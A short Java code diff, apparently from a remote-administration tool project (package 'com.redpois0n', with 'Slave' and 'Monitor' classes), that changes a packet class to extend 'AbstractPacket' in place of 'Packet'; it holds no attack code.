@@ -3,7 +3,7 @@ package com.redpois0n.packets;
 import com.redpois0n.Monitor;
 import com.redpois0n.Slave;
 
-public class PacketMONITOR extends Packet {
+public class PacketMONITOR extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
